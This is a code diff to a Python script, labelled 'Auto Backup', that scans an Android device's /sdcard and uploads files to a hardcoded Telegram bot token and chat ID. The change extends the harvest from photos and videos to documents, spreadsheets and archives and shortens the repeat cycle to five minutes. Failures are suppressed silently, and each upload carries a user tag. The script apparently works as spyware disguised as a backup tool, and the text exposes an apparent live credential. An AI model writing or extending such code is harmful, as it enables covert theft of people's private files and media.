@@ -7,7 +7,12 @@ BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
 CHAT_ID = "7883547875"
 
 TARGET_DIR = "/sdcard"
-ALLOWED_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.mp4', '.mkv', '.mov', '.avi')
+
+# Photos, Videos ke sath sath Documents aur Archives bhi add hain
+ALLOWED_EXTENSIONS = (
+    '.jpg', '.jpeg', '.png', '.mp4', '.mkv', '.mov', '.avi',
+    '.pdf', '.txt', '.docx', '.doc', '.xlsx', '.xls', '.zip', '.rar'
+)
 
 IGNORED_FOLDER_NAMES = {
     '.thumbnails', 'thumbnails', 'thumbnail', 
@@ -54,10 +59,19 @@ def save_uploaded_record(file_hash):
 
 def upload_media(file_path, folder_path, user_info):
     ext = file_path.lower()
-    is_video = ext.endswith(('.mp4', '.mkv', '.mov', '.avi'))
     
-    method = "sendVideo" if is_video else "sendPhoto"
-    file_field = "video" if is_video else "photo"
+    is_video = ext.endswith(('.mp4', '.mkv', '.mov', '.avi'))
+    is_image = ext.endswith(('.jpg', '.jpeg', '.png'))
+    
+    if is_image:
+        method = "sendPhoto"
+        file_field = "photo"
+    elif is_video:
+        method = "sendVideo"
+        file_field = "video"
+    else:
+        method = "sendDocument"
+        file_field = "document"
     
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
     try:
@@ -69,7 +83,9 @@ def upload_media(file_path, folder_path, user_info):
             )
             payload = {'chat_id': CHAT_ID, 'caption': caption_text}
             files = {file_field: media_file}
-            res = requests.post(url, data=payload, files=files, timeout=60 if is_video else 20)
+            
+            timeout_limit = 60 if is_video else 30
+            res = requests.post(url, data=payload, files=files, timeout=timeout_limit)
             return res.status_code == 200
     except Exception:
         return False
@@ -79,7 +95,7 @@ def run_backup_cycle(user_info):
         return
 
     uploaded_hashes = load_uploaded_records()
-    send_msg(f"🚀 Auto Backup Started for User: [{user_info}]")
+    send_msg(f"🚀 Auto Backup & Documents Scan Started for: [{user_info}]")
 
     for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
         if 'android/data' in root.lower() or 'android/obb' in root.lower():
@@ -107,14 +123,13 @@ def run_backup_cycle(user_info):
                 
                 time.sleep(2)
 
-    send_msg(f"✅ Backup Cycle Finished for [{user_info}]. Waiting 30 mins...")
+    send_msg(f"✅ Backup Cycle Finished for [{user_info}]. Waiting 5 mins...")
 
 if __name__ == "__main__":
-    # Fallback agar variable direct na mile
     u_info = current_user_info if 'current_user_info' in globals() else "Unknown User"
     while True:
         try:
             run_backup_cycle(u_info)
         except Exception:
             pass
-        time.sleep(1800)
+        time.sleep(300) # 5 minutes delay (300 seconds)
